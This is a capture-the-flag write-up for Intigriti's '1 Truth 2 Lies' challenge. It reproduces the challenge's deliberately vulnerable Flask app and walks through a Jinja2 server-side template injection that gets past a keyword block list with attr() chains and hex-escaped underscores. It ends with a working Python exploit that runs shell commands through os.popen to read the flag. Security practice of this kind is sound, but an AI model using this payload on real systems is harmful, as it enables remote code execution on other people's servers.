# Intigriti CTF 1 Truth 2 Lies

![image](https://user-images.githubusercontent.com/19681324/158212972-d61fdbd6-6e10-486e-abe6-6f7ed4179405.png)

When you go to the url, there is not much to look for 

![image](https://user-images.githubusercontent.com/19681324/158291815-92683e8c-d102-4e3d-8a62-cccb2172429f.png)

But there is one app.py provided in the challenge to download. 

```
from flask import Flask, request, render_template_string, render_template

app = Flask(__name__)


@app.route('/')
def home():
    return render_template('index.html')


@app.route("""/
             ''''''                                                                                                                                                          bbbbbbbb                                           
  1111111    '::::'                             VVVVVVVV           VVVVVVVV                 lllllll                   333333333333333                              444444444 b::::::b              1111111    333333333333333   
 1::::::1    '::::'                             V::::::V           V::::::V                 l:::::l                  3:::::::::::::::33                           4::::::::4 b::::::b             1::::::1   3:::::::::::::::33 
1:::::::1    ':::''                             V::::::V           V::::::V                 l:::::l                  3::::::33333::::::3                         4:::::::::4 b::::::b            1:::::::1   3::::::33333::::::3
111:::::1   ':::'                               V::::::V           V::::::V                 l:::::l                  3333333     3:::::3                        4::::44::::4  b:::::b            111:::::1   3333333     3:::::3
   1::::1   ''''      mmmmmmm    mmmmmmm         V:::::V           V:::::Vuuuuuu    uuuuuu   l::::lnnnn  nnnnnnnn                3:::::3rrrrr   rrrrrrrrr      4::::4 4::::4  b:::::bbbbbbbbb       1::::1               3:::::3
   1::::1           mm:::::::m  m:::::::mm        V:::::V         V:::::V u::::u    u::::u   l::::ln:::nn::::::::nn              3:::::3r::::rrr:::::::::r    4::::4  4::::4  b::::::::::::::bb     1::::1               3:::::3
   1::::1          m::::::::::mm::::::::::m        V:::::V       V:::::V  u::::u    u::::u   l::::ln::::::::::::::nn     33333333:::::3 r:::::::::::::::::r  4::::4   4::::4  b::::::::::::::::b    1::::1       33333333:::::3 
   1::::l          m::::::::::::::::::::::m         V:::::V     V:::::V   u::::u    u::::u   l::::lnn:::::::::::::::n    3:::::::::::3  rr::::::rrrrr::::::r4::::444444::::444b:::::bbbbb:::::::b   1::::l       3:::::::::::3  
   1::::l          m:::::mmm::::::mmm:::::m          V:::::V   V:::::V    u::::u    u::::u   l::::l  n:::::nnnn:::::n    33333333:::::3  r:::::r     r:::::r4::::::::::::::::4b:::::b    b::::::b   1::::l       33333333:::::3 
   1::::l          m::::m   m::::m   m::::m           V:::::V V:::::V     u::::u    u::::u   l::::l  n::::n    n::::n            3:::::3 r:::::r     rrrrrrr4444444444:::::444b:::::b     b:::::b   1::::l               3:::::3
   1::::l          m::::m   m::::m   m::::m            V:::::V:::::V      u::::u    u::::u   l::::l  n::::n    n::::n            3:::::3 r:::::r                      4::::4  b:::::b     b:::::b   1::::l               3:::::3
   1::::l          m::::m   m::::m   m::::m             V:::::::::V       u:::::uuuu:::::u   l::::l  n::::n    n::::n            3:::::3 r:::::r                      4::::4  b:::::b     b:::::b   1::::l               3:::::3
111::::::111       m::::m   m::::m   m::::m              V:::::::V        u:::::::::::::::uul::::::l n::::n    n::::n3333333     3:::::3 r:::::r                      4::::4  b:::::bbbbbb::::::b111::::::1113333333     3:::::3
1::::::::::1       m::::m   m::::m   m::::m               V:::::V          u:::::::::::::::ul::::::l n::::n    n::::n3::::::33333::::::3 r:::::r                    44::::::44b::::::::::::::::b 1::::::::::13::::::33333::::::3
1::::::::::1       m::::m   m::::m   m::::m                V:::V            uu::::::::uu:::ul::::::l n::::n    n::::n3:::::::::::::::33  r:::::r                    4::::::::4b:::::::::::::::b  1::::::::::13:::::::::::::::33 
111111111111       mmmmmm   mmmmmm   mmmmmm                 VVV               uuuuuuuu  uuuullllllll nnnnnn    nnnnnn 333333333333333    rrrrrrr                    4444444444bbbbbbbbbbbbbbbb   111111111111 333333333333333""")
def WH4TSGO1NG0N():
    BRRRRR_RUNNING = request.args.get('input', None)
    if BRRRRR_RUNNING is None:
        return 'BRRRRR_RUNNING'
    else:
        return 'Your input: {}'.format(BRRRRR_RUNNING)


@app.route("""/
 ▄█    ▄▄▄▄███▄▄▄▄         ▄█    █▄  ███    █▄   ▄█       ███▄▄▄▄      ▄████████    ▄████████    ▄████████ ▀█████████▄   ▄█          ▄████████ 
███  ▄██▀▀▀███▀▀▀██▄      ███    ███ ███    ███ ███       ███▀▀▀██▄   ███    ███   ███    ███   ███    ███   ███    ███ ███         ███    ███ 
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▀    ███    ███   ███    ███   ███    ███ ███         ███    █▀  
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄██▀  ███        ▄███▄▄▄     
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀██▄  ███       ▀▀███▀▀▀     
███  ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▄  ▀███████████   ███    ███   ███    ██▄ ███         ███    █▄  
███  ███   ███   ███      ███    ███ ███    ███ ███▌    ▄ ███   ███   ███    ███   ███    ███   ███    ███   ███    ███ ███▌    ▄   ███    ███ 
█▀    ▀█   ███   █▀        ▀██████▀  ████████▀  █████▄▄██  ▀█   █▀    ██████████   ███    ███   ███    █▀  ▄█████████▀  █████▄▄██   ██████████ 
                                                ▀                                  ███    ███                           ▀""", methods=['GET'])
def WH4TSG01NG0N():
    BRRRRR_RUNNING = request.args.get("input", None)
    if BRRRRR_RUNNING is None:
        return "BRRRRR_RUNNING"
    else:
        for _ in BRRRRR_RUNNING:
            if any(x in BRRRRR_RUNNING for x in {'.', '_', '|join', '[', ']', 'mro', 'base'}):
                return "caught"
            else:
                return render_template_string("Your input: " + BRRRRR_RUNNING)


@app.route("""/
          _____                    _____                            _____                    _____                    _____            _____                    _____                    _____                    _____                    _____                    _____            _____          
         /\    \                  /\    \                          /\    \                  /\    \                  /\    \          /\    \                  /\    \                  /\    \                  /\    \                  /\    \                  /\    \          /\    \         
        /::\    \                /::\____\                        /::\____\                /::\____\                /::\____\        /::\____\                /::\    \                /::\    \                /::\    \                /::\    \                /::\____\        /::\    \        
        \:::\    \              /::::|   |                       /:::/    /               /:::/    /               /:::/    /       /::::|   |               /::::\    \              /::::\    \              /::::\    \              /::::\    \              /:::/    /       /::::\    \       
         \:::\    \            /:::::|   |                      /:::/    /               /:::/    /               /:::/    /       /:::::|   |              /::::::\    \            /::::::\    \            /::::::\    \            /::::::\    \            /:::/    /       /::::::\    \      
          \:::\    \          /::::::|   |                     /:::/    /               /:::/    /               /:::/    /       /::::::|   |             /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \          /:::/    /       /:::/\:::\    \     
           \:::\    \        /:::/|::|   |                    /:::/____/               /:::/    /               /:::/    /       /:::/|::|   |            /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/    /       /:::/__\:::\    \    
           /::::\    \      /:::/ |::|   |                    |::|    |               /:::/    /               /:::/    /       /:::/ |::|   |           /::::\   \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/    /       /::::\   \:::\    \   
  ____    /::::::\    \    /:::/  |::|___|______              |::|    |     _____    /:::/    /      _____    /:::/    /       /:::/  |::|   | _____    /::::::\   \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/    /       /::::::\   \:::\    \  
 /\   \  /:::/\:::\    \  /:::/   |::::::::\    \             |::|    |    /\    \  /:::/____/      /\    \  /:::/    /       /:::/   |::|   |/\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\____\  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\ ___\  /:::/    /       /:::/\:::\   \:::\    \ 
/::\   \/:::/  \:::\____\/:::/    |:::::::::\____\            |::|    |   /::\____\|:::|    /      /::\____\/:::/____/       /:: /    |::|   /::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::|    |/:::/  \:::\   \:::\____\/:::/__\:::\   \:::|    |/:::/____/       /:::/__\:::\   \:::\____\
\:::\  /:::/    \::/    /\::/    / ~~~~~/:::/    /            |::|    |  /:::/    /|:::|____\     /:::/    /\:::\    \       \::/    /|::|  /:::/    /\:::\   \:::\   \::/    /\::/   |::::\  /:::|____|\::/    \:::\  /:::/    /\:::\   \:::\  /:::|____|\:::\    \       \:::\   \:::\   \::/    /
 \:::\/:::/    / \/____/  \/____/      /:::/    /             |::|    | /:::/    /  \:::\    \   /:::/    /  \:::\    \       \/____/ |::| /:::/    /  \:::\   \:::\   \/____/  \/____|:::::\/:::/    /  \/____/ \:::\/:::/    /  \:::\   \:::\/:::/    /  \:::\    \       \:::\   \:::\   \/____/ 
  \::::::/    /                       /:::/    /              |::|____|/:::/    /    \:::\    \ /:::/    /    \:::\    \              |::|/:::/    /    \:::\   \:::\    \            |:::::::::/    /            \::::::/    /    \:::\   \::::::/    /    \:::\    \       \:::\   \:::\    \     
   \::::/____/                       /:::/    /               |:::::::::::/    /      \:::\    /:::/    /      \:::\    \             |::::::/    /      \:::\   \:::\____\           |::|\::::/    /              \::::/    /      \:::\   \::::/    /      \:::\    \       \:::\   \:::\____\    
    \:::\    \                      /:::/    /                \::::::::::/____/        \:::\__/:::/    /        \:::\    \            |:::::/    /        \:::\   \::/    /           |::| \::/____/               /:::/    /        \:::\  /:::/    /        \:::\    \       \:::\   \::/    /    
     \:::\    \                    /:::/    /                  ~~~~~~~~~~               \::::::::/    /          \:::\    \           |::::/    /          \:::\   \/____/            |::|  ~|                    /:::/    /          \:::\/:::/    /          \:::\    \       \:::\   \/____/     
      \:::\    \                  /:::/    /                                             \::::::/    /            \:::\    \          /:::/    /            \:::\    \                |::|   |                   /:::/    /            \::::::/    /            \:::\    \       \:::\    \         
       \:::\____\                /:::/    /                                               \::::/    /              \:::\____\        /:::/    /              \:::\____\               \::|   |                  /:::/    /              \::::/    /              \:::\____\       \:::\____\        
        \::/    /                \::/    /                                                 \::/____/                \::/    /        \::/    /                \::/    /                \:|   |                  \::/    /                \::/____/                \::/    /        \::/    /        
         \/____/                  \/____/                                                   ~~                       \/____/          \/____/                  \/____/                  \|___|                   \/____/                  ~~                       \/____/          \/____/""")
def WH4T5GO1NG0N():
    BRRRRR_RUNNING = request.args.get("input", None)
    if BRRRRR_RUNNING is None:
        return "BRRRRR_RUNNING"
    if "{{" and "}}" in BRRRRR_RUNNING:
        return "BRRRRR_RUNNING"
    else:
        return "Your input: " + BRRRRR_RUNNING


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5555, debug=True)

```
Now if you look at second route ( I'm vulnerable )   this line **return render_template_string("Your input: " + BRRRRR_RUNNING)** saying loudly that this is an SSTI. **render_template_string** methos here is the culprit.

But route is something which is difficult to access through the browser. So we will use a python script to access the url


Also there are few restrictions **{'.', '_', '|join', '[', ']', 'mro', 'base'}**  we need to bypass to get the rce with ssti.

This link https://hackmd.io/@Chivato/HyWsJ31dI and https://0day.work/jinja2-template-injection-filter-bypasses/ explains how we can bypass this restrictions

![image](https://user-images.githubusercontent.com/19681324/158292343-419828da-14e8-4660-9025-33e6686e7d3d.png)

However, when we use the payload **{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}** we get "caught" in the response

![image](https://user-images.githubusercontent.com/19681324/158292671-aaf21484-52c2-4006-8993-74589d1d8d1d.png)

This is because those hex values are getting decoded to their respective values. we can use either burp decoded or cyberchef to encode it once more to hex

![image](https://user-images.githubusercontent.com/19681324/158293326-06844629-d277-4be8-b419-67aa28ce6a22.png)

First we will run the **ls -la** command to get the content of the directory

![image](https://user-images.githubusercontent.com/19681324/158293474-e9ddcc73-bee5-42ec-bd93-f8216d4fbdc6.png)

Final payload for reading the flag

```
import requests

requests.packages.urllib3.disable_warnings() 


proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}


url = "https://1truth2lies.ctf.intigriti.io/"

path = """/
 ▄█    ▄▄▄▄███▄▄▄▄         ▄█    █▄  ███    █▄   ▄█       ███▄▄▄▄      ▄████████    ▄████████    ▄████████ ▀█████████▄   ▄█          ▄████████ 
███  ▄██▀▀▀███▀▀▀██▄      ███    ███ ███    ███ ███       ███▀▀▀██▄   ███    ███   ███    ███   ███    ███   ███    ███ ███         ███    ███ 
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▀    ███    ███   ███    ███   ███    ███ ███         ███    █▀  
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███  ▄███▄▄▄      ▄███▄▄▄▄██▀   ███    ███  ▄███▄▄▄██▀  ███        ▄███▄▄▄     
███▌ ███   ███   ███      ███    ███ ███    ███ ███       ███   ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ▀███████████ ▀▀███▀▀▀██▄  ███       ▀▀███▀▀▀     
███  ███   ███   ███      ███    ███ ███    ███ ███       ███   ███   ███    █▄  ▀███████████   ███    ███   ███    ██▄ ███         ███    █▄  
███  ███   ███   ███      ███    ███ ███    ███ ███▌    ▄ ███   ███   ███    ███   ███    ███   ███    ███   ███    ███ ███▌    ▄   ███    ███ 
█▀    ▀█   ███   █▀        ▀██████▀  ████████▀  █████▄▄██  ▀█   █▀    ██████████   ███    ███   ███    █▀  ▄█████████▀  █████▄▄██   ██████████ 
                                                ▀                                  ███    ███                           ▀"""
                                                


#payload = "{{'7' * 7}}"
#payload = "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"

cmd = 'cat flag\x5c\x78\x32\x65txt'
payload = "{{request|attr('application')|attr('\x5c\x78\x35\x66\x5c\x78\x35\x66globals\x5c\x78\x35\x66\x5c\x78\x35\x66')|attr('\x5c\x78\x35\x66\x5c\x78\x35\x66getitem\x5c\x78\x35\x66\x5c\x78\x35\x66')('\x5c\x78\x35\x66\x5c\x78\x35\x66builtins\x5c\x78\x35\x66\x5c\x78\x35\x66')|attr('\x5c\x78\x35\x66\x5c\x78\x35\x66getitem\x5c\x78\x35\x66\x5c\x78\x35\x66')('\x5c\x78\x35\x66\x5c\x78\x35\x66import\x5c\x78\x35\x66\x5c\x78\x35\x66')('os')|attr('popen')('"+cmd+"')|attr('read')()}}"

res = requests.get(url=url+'/'+path+'?input='+payload, proxies=proxies ,  verify = False)

print(res.text)

```
